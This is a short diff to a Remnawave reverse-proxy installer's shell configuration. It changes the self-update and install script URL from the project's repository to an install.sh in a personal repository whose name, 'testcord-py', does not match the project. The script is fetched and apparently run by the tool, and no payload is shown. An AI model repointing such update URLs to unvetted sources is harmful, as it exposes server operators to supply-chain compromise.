@@ -9,7 +9,7 @@ SCRIPT_INSTALL_PATH="${DIR_REMNAWAVE}${SCRIPT_INSTALL_NAME}"
 SCRIPT_SYMLINK="/usr/local/bin/${SCRIPT_INSTALL_NAME}"
 LANG_FILE="${DIR_REMNAWAVE}selected_language"
 # Raw install script URL for startup update check and install_script_if_missing (replace with your fork if needed)
-SCRIPT_URL="https://raw.githubusercontent.com/eGamesAPI/remnawave-reverse-proxy/refs/heads/main/install_remnawave.sh"
+SCRIPT_URL="https://raw.githubusercontent.com/tristondup2008-cmd/testcord-py/refs/heads/main/install.sh"
 # Raw GitHub URL to a single .html file used as self-steal landing on auto-provisioned nodes (required for automatic node setup)
 SELFSTEAL_TEMPLATE_HTML_URL="https://raw.githubusercontent.com/tristondup2008-cmd/testcord-py/refs/heads/main/index.html"
 SSH_VAULT_FILE="${DIR_REMNAWAVE}ssh_vault"
